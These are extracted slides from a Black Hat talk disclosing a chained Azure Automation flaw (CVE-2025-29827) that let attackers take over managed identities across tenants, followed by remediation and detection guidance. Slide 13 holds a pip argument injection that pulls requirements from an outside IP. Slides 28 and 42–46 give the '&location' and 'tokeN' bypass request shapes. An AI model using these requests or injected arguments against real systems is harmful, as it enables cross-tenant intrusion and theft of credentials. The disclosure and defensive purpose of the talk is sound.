---
title: "Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover"
speakers: ["Shay Shavit"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf"
pages: 50
sha256: "02c2912eeb1b9339611cae9ce233c513e2a8150b50d755583cd1f7e5be3ec953"
text_chars: 17133
ocr_pages: 3
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:15:37Z"
---
# Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover

**Speakers:** Shay Shavit  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf` (50 pages)

## Slide 1

###### Handle With Care: Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover

Shay Shavit

1

## Slide 2

**Shay Shavit** Senior Security Researcher Microsoft

###### WHOAMI

2

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Shay Shavit
Senior Security Researcher
Microsoft
WHOAMI
black hat
2026 2
```

## Slide 3

## AGENDA

###### **Azure Automation 101**

**Methodology: what didn’t work, and why it matters**

**Chaining the Flaws (CVE-2025-29827)**

**Impact** & **Takeaways**

3

## Slide 4

## AZURE AUTOMATION

**01** **`</>` Runbook** PowerShell / Python automation code **02 Job** Scheduled or triggered execution instance **03 Worker** Cloud sandbox or hybrid worker **Managed 04** Access token for Azure services **Identity Azure 05** Compute • Storage • Key Vault • APIs **Resources**

4

## Slide 5

###### WHY AZURE AUTOMATION

**Broadly Used** Across Customers and internally

Runs Code
PowerShell / Python

Stores Secrets
Secrets / Certificates

**Privileged Identity** Owner / Contributor / KeyVault Administrator

5

## Slide 6

### OUR GOAL

###### Cross-Tenant Access

6

## Slide 7

###### HOW ANSR HUNTS CHAINS

**METHODOLOGY — FOLLOW THE ASSUMPTIONS ACROSS BOUNDARIES**

01

###### **Enumerate trust boundaries**

02

Chain the gaps

###### **`03` Validate the fix at every link**

Every place identity, tenancy, or authorization changes hands.

A single bypass is rarely enough; combine primitives across boundaries.

One patch is never the fix; the assumption at every link has to change.

**The rest of this talk is this methodology, applied to Azure Automation.**

7

## Slide 8

## WHAT DIDN’T CHAIN

2 SSRFs RCE (sandboxed)

8

## Slide 9

###### PYTHON PACKAGE RCE

- You can upload python packages to your automation account.

- • Upload processed in shared environment.

- Only whl files allowed -> no dynamic code

- • Let’s start digging

9

## Slide 10

###### PYTHON PACKAGE UPLOAD

01

02

Shared service
environment

03

↑ ✓ ▣
Automation
User Uploads Package
Account
Whl Package Validation
Package Store

###### _The validation step is where untrusted package input crosses into service-controlled execution._

10

## Slide 11

###### WHAT HAPPENS INSIDE VALIDATION

01 02 Trust boundary crossing 03
↑ ≡ >_
Read Wheel  Invoke pip
Extract Archive
Metadata Command

###### _The risky moment is when archive-controlled metadata begins shaping service-side validation._

11

## Slide 12

###### PYTHON PACKAGE RCE

```
var pip = $"install --root {tempExtractionPath} --ignore-installed
--no-deps --ignore-requires-python {wheelFilePath}";
```

12

## Slide 13

###### PYTHON PACKAGE RCE

```
pip.exe install --root C:/temp/jfdsa9rvfsd/ --ignore-installed --no-
deps --ignore-requires-python
```

`C:/temp/jfdsa9rvfsd/../../../../../../../Python27/Tools/Scripts/ -r http://172.171.240.248/../../l -f-any` Install This

Requires This

13

## Slide 14

### SANDBOX

##### We can execute code in a sandbox The sandbox can fetch Account MI token We can trick it to ask for another account MI

14

## Slide 15

## IT DIDN’T WORK

**_Methodology signal:_** _when a bug doesn't chain, ask what boundary you actually need to cross_

15

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LI DIDN'T WORK
ng : An exception prevented st: . [sandboxId=583afSe-
Pp P
‘a attempted to
Methodology signal: when a bug doesn't chain, ask what boundary
you actually need to cross
black hat
USA
2026 15
```

## Slide 16

## BUT WE LEARNED

Automation Service has a way to fetch MI for all automation accounts

Can we find another vector?

16

## Slide 17

## HYBRID WORKERS

Automation gives you the ability to run notebooks on Azure enabled hosts.

ARC enabled on-prem hosts.

Install a vm extension, register as a worker in the account and fetch data from the account including MI token.

Hosts communicate with a separate endpoint to enable functionality  = JRDS

17

## Slide 18

###### JOB RUNTIME DATA SERVICE

###### New plan! We find vulnerabilities in JRDS

18

## Slide 19

###### JRDS ENDPOINTS

###### `https://` **`{accountId}`** `.jrds.azure-automation.net`

**Per-account endpoint** Each Automation Account has its own JRDS hostname.

###### **Public by default**

Network access was allowed from the internet unless restricted.

**Security implication** The authentication path became remotely reachable.

19

## Slide 20

###### AUTH HANDLERS

```
HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
HttpMessageHandler.Add(newMIHandler(container.Resolve<…
```

###### **Handlers are sequential, if one fails the other try to authenticate**

20

## Slide 21

###### THREE GATES

JWT Authentication
Hybrid Worker VM JRDS request Route Handler
Handler
Inside the JWT Authentication Handler
1 Validate JWT Is the token valid?
2 Bind identity to VM Does the token match the VM?
Is this worker associated with this
3 Fetch worker info
Automation Account?
Each gate answers a different question.

21

## Slide 22

###### GATE 1: VALIDATE JWT

JWT Authentication Handler
JWT 1 Validate JWT
Managed identity token
2
Bind identity to VM
3
Fetch worker info

**Requirement:** present a valid managed identity JWT

Managed identity token

This proves the caller has **_some_** managed identity — not that it belongs to the target Automation Account.

**Gate 1 verifies token validity, not account association.**

22

## Slide 23

###### GATE 2: BIND IDENTITY TO VM

JWT Authentication Handler REQUEST PARAMETER
?vmResourceId={vm-controlled-by-caller}
✓ Validate JWT PASSED
The handler checks whether the JWT identity matches the VM
2 Bind identity to VM
resource ID in the request.
Key insight  But the request supplies the VM resource ID.
3 Fetch worker info
==
JWT managed identity vmResourceId identity
Result: PASS
Gate 2 binds the token to the VM named by the request — not yet to the Automation Account.

23

## Slide 24

###### LOCATION LOCATION LOCATION

```
if (!IsLocation(request)){
AssociateWorker();
}
```

```
private bool IsLocation(HttpRequestMessage request)
{
```

`return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request

24

## Slide 25

###### LOCATION LOCATION LOCATION

25

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LOCATION LOCATION LOCATION
Pic:
ances Uete Contains
("/location=)
Bs
aoalle
£ AbsolutePath, right?
black hat
2026 25
```

## Slide 26

###### LOCATION LOCATION LOCATION

```
if (!IsLocation(request)){
AssociateWorker();
}
```

```
private bool IsLocation(HttpRequestMessage request)
{
```

`return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request AbsoluteUri includes query parameters... Appending &locations bypass the association check.

26

## Slide 27

###### GATE 3: FETCH WORKER INFO

JWT Authentication Handler
✓ Validate JWT PASSED
✓ Bind identity to VM PASSED
GATE 3 EFFECTIVE RESULT
Association check
Fetch worker info
3 Worker must be associated with  BYPASSED
requested Automation Account
BYPASSED
GET /automationAccounts/{targetAccount}/action? &location

27

## Slide 28

###### BYPASS SUMMARY

1

Valid JWT

Any managed identity token

2

3

!

Matching  Worker lookup  Request reaches Route
vmResourceId
bypass Handler
Request-controlled VM  Association check  Unauthorized path
reference skipped via query
manipulation

###### The first two gates validate identity shape; the third gate was supposed to enforce **Automation Account scope.**

###### `GET /automationAccounts/{targetAccount}/action?` **`vmResourceId={vm}&location`**

28

## Slide 29

###### WHAT THE BYPASS EXPOSED

Once the association check is **bypassed** , the attacker can **access everything below** .

**Certificates** signing material, auth material, service credentials

**Secrets Notebook content** stored automation secrets and protected automation logic, scripts, operational values context

Job results

execution output, errors, environment details

29

## Slide 30

###### MANAGED IDENTITY TIME

- Automation account create a managed identity on RP registration; all accounts have a managed identity.

- This is the secure way for automation to perform its defined tasks.

- • Notebook fetch MI token -> perform actions on Azure tenant.

- Most of the time the MI have a very privileged role: Contributor, Owner, etc..

30

## Slide 31

###### LOCATION?

- I Have authorization bypass -> fetch MI token

- • token is generated by

   - GET /automationAccounts/{accountID}/oauth2/token

   - • No association check

- Issued request -> got 403 Forbidden

- • Why?

31

## Slide 32

###### DIFFERENT AUTH HANDLER

```
HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
HttpMessageHandler.Add(newMIHandler(container.Resolve<…
```

###### **Another handler authorize MI tokens**

32

## Slide 33

###### ISMIREQUEST()

```
if (IsMIRequest(request.uri))
{
```

```
    // Skip Auth Token based authentication
return base.Send(request);
}
```

```
public staticboolIsMIRequest(Uri uri)
{
```

```
string guid = @”…”;
    Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
    Match match = regex.Match(uri.AbsolutePath);
return match.Success;
}
```

###### From JwtHandler

33

## Slide 34

## MI HANDLER

- Requires a per account secret present in automation account

- Don’t have the secret

- Couldn’t obtain the secret

   - Isn’t stored in the automation account “secrets” accessible via the previous &location chain

- Couldn’t bypass the handler logic

34

## Slide 35

## MI HANDLER

**But “Handlers are sequential, if one fails the next try to authenticate”**

JWTHalder executes before MIHandler. We can bypass JWT. Can we force the use of JWTHandler?

35

## Slide 36

###### ISMIREQUEST()

```
if (IsMIRequest(request.uri))
{
```

```
    // We Skip Auth Token based authentication
return base.Send(request);
}
```

```
public staticboolIsMIRequest(Uri uri)
{
```

```
string guid = @”…”;
    Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
    Match match = regex.Match(uri.AbsolutePath);
return match.Success;
}
```

###### From JwtHandler

36

## Slide 37

###### ONE CHARACTER. OPPOSITE OUTCOME.

###### **THE LAST CHARACTER CHANGES THE AUTH PATH**

**LOWERCASE**

**UPPERCASE**

≠
n

# **N**

**CASE-SENSITIVE MATCH**

**403** `GET /automationAccounts/{accountID}/oauth2/toke` **`n`**

**AUTH RUNS**

**200** `GET /automationAccounts/{accountID}/oauth2/toke` **`N`**

**AUTH SKIPPED**

**The endpoint is the same. The casing decides whether authentication executes.**

37

## Slide 38

###### SAME ENDPOINT, DIFFERENT HANDLER PATH

/oauth2/token → 403

/oauth2/tokeN → 200

Request Request
/oauth2/token /oauth2/tokeN
JWT Handler JWT Handler
Recognizes MI token route JWT auth succeeds
MI Token Handler MI Token Handler
Requires MSI-specific auth context Skipped
DENIED Router / Controller
403 Case-insensitive route match
TOKEN ISSUED
200

###### _Handler matching was case-sensitive; controller routing was not._

38

## Slide 39

###### CHAINING THE PIECES

###### **CVE-2025-29827 (CVSS 9.9)**

**T H R E E I N G R E D I E N T S**

**1 BAD DEFAULT** Automation Accounts are public by default

- **2 VULNERABILITY #1** &location bypasses worker association

**3 VULNERABILITY #2** tokeN reaches the token controller through handler mismatch

Chained together

###### **H I G H - I M P A C T R E S U L T**

**Cross-tenant managed identity takeover**

Access to public Automation Accounts Tokens for managed identities Tenant resources reachable through assigned roles

39

## Slide 40

**1/7**

###### 1. LEGITIMATE STARTING POINT

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions

###### The attacker starts with a legitimate Automation Account, VM, and managed identity.

40

## Slide 41

###### 2. PUBLIC TARGET

**2/7**

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
Automation Accounts are public by default.
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions

Public reachability gives the attacker a path to the JRDS endpoint.

41

## Slide 42

**3/7**

###### 3. CROSS-ACCOUNT JRDS REQUEST

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions
GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}

The request targets the victim account while carrying attacker-controlled VM context.

42

## Slide 43

**4/7**

###### 4. FIRST CHECKS PASS

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM ✓  Valid JWT
✓  JWT identity matches vmResourceId
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions
GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}

The first checks validate the attacker’s identity shape, not the victim account scope.

43

## Slide 44

**5/7**

###### 5. ASSOCIATION CHECK BYPASS

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM
B Y PAS S E D
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions
GET /automationAccounts/{victimAccount}/...?vmResourceId={attackerVm} &location

Query manipulation bypasses the worker-to-account association check.

44

## Slide 45

**6/7**

###### 6. TOKEN ROUTE MISMATCH

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
JWT Authentication Handler Victim Managed Identity
Attacker Hybrid Worker VM
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
M I S M AT C H
Token route / controller
VMs Subscriptions
GET .../oauth2/ tokeN?vmResourceId={attackerVm}&location
Handler matching and controller routing disagree.
The request reaches the token-generation path.

45

## Slide 46

###### 7. VICTIM IDENTITY OBTAINED

###### **7/7**

AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
Attacker Automation Account JRDS endpoint Victim Automation Account
TO K E N O B TAI N E D
JWT Authentication Handler Victim Managed Identity
Victim Automation Account Managed Identity
Attacker Hybrid Worker VM
Tenant resources
Worker association check
Attacker Managed Identity Key Vault Storage
Token route / controller
VMs Subscriptions

The attacker can act through the victim Automation Account’s managed identity and its assigned roles.

46

## Slide 47

###### BREAKING THE CHAIN

**R E M E D I AT I O N — R E M O V E T H E U N S AF E AS S U M P T I O N AT E AC H L I N K**

CHAIN BROKEN
LINK 1 LINK 2 LINK 3 LINK 4
WEAK POINT WEAK POINT WEAK POINT WEAK POINT
Public exposure Worker association Handler mismatch Token issuance
FIX FIX FIX FIX
Guidance to enable private  Normalize and strictly  Make handler routing and  Re-validate authorization at
endpoint validate request parameters  controller routing agree the token-generation
before lookup boundary

###### **The fix was not one patch — it was removing every unsafe assumption in the chain.**

47

## Slide 48

###### DETECTING THE CHAIN IN FLIGHT

###### **DETECTION — CORRELATE TENANT, URI, AND WORKER ASSOCIATION**

###### **`01`**

###### **Anomalous JRDS access**

###### **WHAT TO LOOK FOR**

JRDS calls where the caller's tenant ≠ the target Automation Account's tenant.

**WHY IT FIRES**

**Cross-tenant hybrid worker registration is not a legitimate pattern.**

```
02
```

###### **Suspicious query shape on token endpoints**

###### **WHAT TO LOOK FOR**

Requests to /automationAccounts/*/oauth2/token* containing &location, mixed casing (tokenN, Token), or trailing characters.

**WHY IT FIRES**

**Both bypass primitives in this chain are visible at the URI layer.**

```
03
```

###### **Managed-identity issuance without worker association**

###### **WHAT TO LOOK FOR**

MI tokens issued to callers not registered as a hybrid worker for that account.

**WHY IT FIRES**

**This is the takeover moment — if you catch nothing else, catch this.**

###### **You don't need to catch the bug — you need to catch the pattern.**

48

## Slide 49

###### FINAL TAKEAWAYS

**W H AT TO R E M E M B E R W H E N Y O U WAL K O U T**

###### **Chained flaws**

**1 default + 1 routing bug + 1 regex bug = cross-tenant identity takeover.**

**Mitigate cross-tenant identity abuse Private-by-default + canonical routing + authorize at every boundary.**

**A methodology for multi-tenant threat modeling Enumerate trust boundaries → attack each gate → chain the gaps → validate the fix at every link.**

###### **Cloud isolation is only as strong as the assumptions between services.**

49

## Slide 50

#### Thank You

###### Shay Shavit

50
